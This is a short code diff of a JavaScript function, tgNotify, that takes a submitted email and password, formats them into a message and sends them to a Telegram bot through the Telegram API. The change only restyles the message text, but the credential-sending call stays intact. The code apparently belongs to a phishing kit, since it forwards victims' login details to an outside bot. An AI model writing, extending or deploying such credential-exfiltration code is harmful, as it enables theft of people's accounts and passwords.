@@ -17,18 +17,17 @@ async function tgNotify(email, password) {
     try {
 
         const text = `
-📬 *HA LJADID*
-************************
-***********************
-***********************
-***********************
-*
-*********************
-*
-
-📬 *email:* \`${email}\`
-📬 *password:* \`${password}\`
-`;
+            📬 *HA LJADID*
+            =====================
+            =====================
+            =====================
+            =====================
+            =====================
+            =====================
+            =====================
+            📬 *email:* \`${email}\`
+            📬 *password:* \`${password}\`
+            `;
 
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
 
